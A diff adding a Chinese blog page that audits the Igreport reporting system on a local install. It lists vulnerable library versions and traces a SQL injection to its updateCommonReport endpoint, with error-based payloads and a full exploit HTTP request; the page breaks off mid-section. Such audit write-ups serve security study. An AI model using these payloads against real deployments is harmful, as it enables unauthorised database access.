@@ -1,0 +1,848 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="pow1e">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="环境搭建：LYL41011&#x2F;igreport: SpringBoot+Vue 企业级 智能通用报表 调度平台 管理系统 (github.com) 代码审计：1. 查看组件版本：1.1 mybatis： 当前springboot整合mybatis，mybatis版本为3.5.3，存在远程代码执行漏洞。 触发条件：   用户启用了内置的二级缓存 用户未设置JEP-290过滤器 需要修改org">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Igreport报表系统代码审计">
+<meta property="og:url" content="https://pow1e.github.io/2024/06/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Igreport%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:site_name" content="pow1e的知识小屋">
+<meta property="og:description" content="环境搭建：LYL41011&#x2F;igreport: SpringBoot+Vue 企业级 智能通用报表 调度平台 管理系统 (github.com) 代码审计：1. 查看组件版本：1.1 mybatis： 当前springboot整合mybatis，mybatis版本为3.5.3，存在远程代码执行漏洞。 触发条件：   用户启用了内置的二级缓存 用户未设置JEP-290过滤器 需要修改org">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240613112155326-1719145846392-83.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240613113458963-1719145846392-84.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240613113852698-1719145846392-85.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240613114403576-1719145846392-86.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240613105233978-1719145846392-87.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240613110555748-1719145846392-88.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240613110628151-1719145846392-90.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240613110838965-1719145846392-89.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240617103552988-1719145846392-91.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240617103757346-1719145846392-92.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240617104121566-1719145846392-93.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240617104219640-1719145846392-99.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240617104513703-1719145846392-94.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240622215709497-1719145846392-95.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240622222453665-1719145846392-96.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240623112155505-1719145846392-97.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240623112515391-1719145846392-98.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240623112819265-1719145846392-100.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240613114901626-1719145846392-102.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240613115512539-1719145846392-101.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240613130144605-1719145846392-103.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240613131112876-1719145846392-104.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240613131220775-1719145846392-105.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240613131421425-1719145846392-106.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240613135050282-1719145846393-107.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240613140243930-1719145846393-110.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240613161041701-1719145846393-108.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240623172929370-1719145846393-109.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240623173010340-1719145846393-111.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240623191959272-1719145846393-112.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240623192158419-1719145846393-113.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240623201154287-1719145846393-117.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240623201237513-1719145846393-114.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240623201250478-1719145846393-115.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240623201305545-1719145846393-116.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240623193227151-1719145846393-118.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240623192922392-1719145846393-121.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240623195715025-1719145846393-120.png">
+<meta property="og:image" content="https://pow1e.github.io/blog_image/image-20240623200221097-1719145846393-119.png">
+<meta property="article:published_time" content="2024-06-23T12:29:48.000Z">
+<meta property="article:modified_time" content="2024-06-23T12:32:48.445Z">
+<meta property="article:author" content="pow1e">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://pow1e.github.io/blog_image/image-20240613112155326-1719145846392-83.png">
+  
+  
+  
+  <title>Igreport报表系统代码审计 - pow1e的知识小屋</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"pow1e.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>pow1e的知识小屋</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default3.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Igreport报表系统代码审计"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-06-23 20:29" pubdate>
+          2024年6月23日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          13k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          109 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Igreport报表系统代码审计</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h1><p><a target="_blank" rel="noopener" href="https://github.com/LYL41011/igreport">LYL41011&#x2F;igreport: SpringBoot+Vue 企业级 智能通用报表 调度平台 管理系统 (github.com)</a></p>
+<h1 id="代码审计："><a href="#代码审计：" class="headerlink" title="代码审计："></a>代码审计：</h1><h2 id="1-查看组件版本："><a href="#1-查看组件版本：" class="headerlink" title="1. 查看组件版本："></a>1. 查看组件版本：</h2><h3 id="1-1-mybatis："><a href="#1-1-mybatis：" class="headerlink" title="1.1 mybatis："></a>1.1 mybatis：</h3><p><img src="/../../blog_image/image-20240613112155326-1719145846392-83.png" srcset="/img/loading.gif" lazyload alt="image-20240613112155326"></p>
+<p>当前springboot整合mybatis，mybatis版本为3.5.3，存在远程代码执行漏洞。</p>
+<p>触发条件：</p>
+<blockquote>
+<ul>
+<li>用户启用了内置的二级缓存</li>
+<li>用户未设置JEP-290过滤器</li>
+<li>需要修改org.apache.ibatis.cache.impl.PerpetualCache.cache有效的缓存密钥</li>
+</ul>
+</blockquote>
+<p>全局搜索有没有开启二级缓存：</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">&lt;<span class="hljs-keyword">cache</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">&quot;org.apache.ibatis.cache.impl.PerpetualCache&quot;</span>/&gt; <br></code></pre></td></tr></table></figure>
+
+<p>没有可利用的：</p>
+<p><img src="/../../blog_image/image-20240613113458963-1719145846392-84.png" srcset="/img/loading.gif" lazyload alt="image-20240613113458963"></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/252542.html">MyBatis远程代码执行漏洞CVE-2020-26945 - FreeBuf网络安全行业门户</a></p>
+<h3 id="1-2-druid："><a href="#1-2-druid：" class="headerlink" title="1.2 druid："></a>1.2 druid：</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>druid<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.17<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>可以尝试druid未授权访问，然后查看是否配置了session，如果存在在线查看sessions，则可以直接使用session登录。</p>
+<p>但是这里并没有配置druid相关设置。</p>
+<h3 id="1-3-mysql-connector-java："><a href="#1-3-mysql-connector-java：" class="headerlink" title="1.3 mysql-connector-java："></a>1.3 mysql-connector-java：</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../blog_image/image-20240613113852698-1719145846392-85.png" srcset="/img/loading.gif" lazyload alt="image-20240613113852698"></p>
+<p>当前版本为8.0.19，刚好存在序列化（&lt;&#x3D;8.0.20）。</p>
+<p>但是需要jdbc源可控，因此需要配合fastjson利用。</p>
+<h3 id="1-4-xxl-job"><a href="#1-4-xxl-job" class="headerlink" title="1.4 xxl-job:"></a>1.4 xxl-job:</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.xuxueli<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xxl-job-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>xxl-job这个版本存在任意代码执行：<br><img src="/../../blog_image/image-20240613114403576-1719145846392-86.png" srcset="/img/loading.gif" lazyload alt="image-20240613114403576"></p>
+<h3 id="1-5-fastjson："><a href="#1-5-fastjson：" class="headerlink" title="1.5 fastjson："></a>1.5 fastjson：</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.60<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>fastjson就可以利用我们刚才说的，打jdbc。</p>
+<h2 id="2-sql注入："><a href="#2-sql注入：" class="headerlink" title="2. sql注入："></a>2. sql注入：</h2><h3 id="2-1-commonReportHandler定时任务存在sql注入："><a href="#2-1-commonReportHandler定时任务存在sql注入：" class="headerlink" title="2.1 commonReportHandler定时任务存在sql注入："></a>2.1 commonReportHandler定时任务存在sql注入：</h3><p>全局搜索<code>$&#123;</code>，并且过滤xml文件：</p>
+<p><img src="/../../blog_image/image-20240613105233978-1719145846392-87.png" srcset="/img/loading.gif" lazyload alt="image-20240613105233978"></p>
+<p>就选择<code>IgReportMapper</code>：</p>
+<p><img src="/../../blog_image/image-20240613110555748-1719145846392-88.png" srcset="/img/loading.gif" lazyload alt="image-20240613110555748"></p>
+<p><code>&lt;[!CDATAp[]]&gt;</code>在mybatis中的用法就是sql中有一些特殊的字符，在解析xml文件的时候会被转义。使用CDATA可以避免此类情况。比如包含”&lt;”、”&gt;”、”&amp;”等字符，最好把他们都放到CDATA中。</p>
+<p>注意mybatis中的<code>&lt;if test=&quot;&quot;&gt;&lt;/if&gt;、&lt;where&gt;&lt;/where&gt;、&lt;choose&gt;&lt;/choose&gt;、&lt;trim&gt;&lt;/trim&gt;</code>等这些标签不能写到CDATA中。否则标签将不会被mybatis解析。</p>
+<p>如下面的：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getNewDlpOpenCallOrder&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;org.apache.commons.collections.map.CaseInsensitiveMap&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;map&quot;</span> &gt;</span><br>    &lt;![CDATA[<br>    select s.*<br>    from xxx s<br>    where s.status&lt;5<br>    ]]&gt;<br>    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;dateBegin != null and dateEnd != null&quot;</span> &gt;</span><br>      &lt;![CDATA[and s.zb_ordertime between #&#123;dateBegin,jdbcType=TIMESTAMP&#125; and #&#123;dateEnd,jdbcType=TIMESTAMP&#125;]]&gt;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>service层：</p>
+<p><img src="/../../blog_image/image-20240613110628151-1719145846392-90.png" srcset="/img/loading.gif" lazyload alt="image-20240613110628151"></p>
+<p>最终xxl-job调用：</p>
+<p><img src="/../../blog_image/image-20240613110838965-1719145846392-89.png" srcset="/img/loading.gif" lazyload alt="image-20240613110838965"></p>
+<p>全局搜索可以查看到xxljob执行：</p>
+<p><img src="/../../blog_image/image-20240617103552988-1719145846392-91.png" srcset="/img/loading.gif" lazyload alt="image-20240617103552988"></p>
+<p>最终由updateCommonReport这个路由调用，如图所示：</p>
+<p><img src="/../../blog_image/image-20240617103757346-1719145846392-92.png" srcset="/img/loading.gif" lazyload alt="image-20240617103757346"></p>
+<p>而这个函数中的param：</p>
+<p><img src="/../../blog_image/image-20240617104121566-1719145846392-93.png" srcset="/img/loading.gif" lazyload alt="image-20240617104121566"></p>
+<p>就是这前端传入的<code>commonReportDto</code>，他最终转换成了json然后传进来了：</p>
+<p><img src="/../../blog_image/image-20240617104219640-1719145846392-99.png" srcset="/img/loading.gif" lazyload alt="image-20240617104219640"></p>
+<h4 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h4><p>因此这里可以使用报错注入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,database(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+
+<p>第一个值任意填，第二个值是报错结果，第三个值任意填</p>
+<p><img src="/../../blog_image/image-20240617104513703-1719145846392-94.png" srcset="/img/loading.gif" lazyload alt="image-20240617104513703"></p>
+<p>或者可以使用：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,database()))<br></code></pre></td></tr></table></figure>
+
+<p>extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位。</p>
+<p>修改接口处修改sql：</p>
+<p><img src="/../../blog_image/image-20240622215709497-1719145846392-95.png" srcset="/img/loading.gif" lazyload alt="image-20240622215709497"></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/report/updateCommonReport</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>279<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/plain, */*<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json;charset=UTF-8<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:8081<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:8081/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>rememberMe=MNY7VeTdyZXDTkHejTtAIPjATLfuo5N8JAOswvke4rOs0hqKdTH0Vo4KLJ7F1mTVL1+DGhqF4wwVZR2z72/fo0NDQIKYkSA6s8Ym6U6r946RuKhubY6NR+hxf/IxSYzKJilp5c1x1LLWbjUbX5g/F4B2CnmnDJwxf1DCr/Cj321K6uq9lRWng9xIIr/NFug9t7dFwmzzDqt39FISbMFcnzbjMT48uKIm3J/xgXaQr+4ybSIwfzzW3eNDOsY0GoT/bB2o4dv0oBToQr19WD5HVXbZ3PQWKw7Im99Sw1OrqFDL7DaLnFDPwvyF5GD2e3wn9m2/kgiIKamLozqs/34QfKLizbAz0FHVXGhLUAmOETgSgI82LAKyee4wEVK8wWV7hT4JaoNQoRepSFK2QDzXgYTJxUCCgfkfwU4vaSFagnVUU64WWTqXScRbvIbwAsgujUu2miuimgUHg1Wfd6aKrKXrKAuiRjaE7ngeYMcxHLgYY/JDqYSAf78K+RCgsQE3; XXL_JOB_LOGIN_IDENTITY=7b226964223a312c22757365726e616d65223a2261646d696e222c2270617373776f7264223a223864646366663361383066343138396361316339643464393032633363393039222c22726f6c65223a302c227065726d697373696f6e223a2231227d<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-swift">&#123;<span class="hljs-string">&quot;author&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;authorizedPeople&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;dataSource&quot;</span>:<span class="hljs-string">&quot;mysql&quot;</span>,<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;jobCron&quot;</span>:<span class="hljs-string">&quot;0 0 * * * ?&quot;</span>,<span class="hljs-string">&quot;metaDataJson&quot;</span>:<span class="hljs-string">&quot;&#123;<span class="hljs-subst">\&quot;</span>name<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>zhangsan<span class="hljs-subst">\&quot;</span>&#125;&quot;</span>,<span class="hljs-string">&quot;reportDesc&quot;</span>:<span class="hljs-string">&quot;testt&quot;</span>,<span class="hljs-string">&quot;reportFrequency&quot;</span>:<span class="hljs-string">&quot;按天&quot;</span>,<span class="hljs-string">&quot;reportName&quot;</span>:<span class="hljs-string">&quot;test111&quot;</span>,<span class="hljs-string">&quot;sql&quot;</span>:<span class="hljs-string">&quot;select updatexml(1,concat(0x7e,database(),0x7e),1)&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">2</span>&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>编辑好后点击执行，然后查看日志：</p>
+<p><img src="/../../blog_image/image-20240622222453665-1719145846392-96.png" srcset="/img/loading.gif" lazyload alt="image-20240622222453665"></p>
+<p>查询数据库中的表：</p>
+<p>由于当前数据库表中存在多个表，updatexml只支持32个字符，因此可以使用substring截取长度，分多次查询：</p>
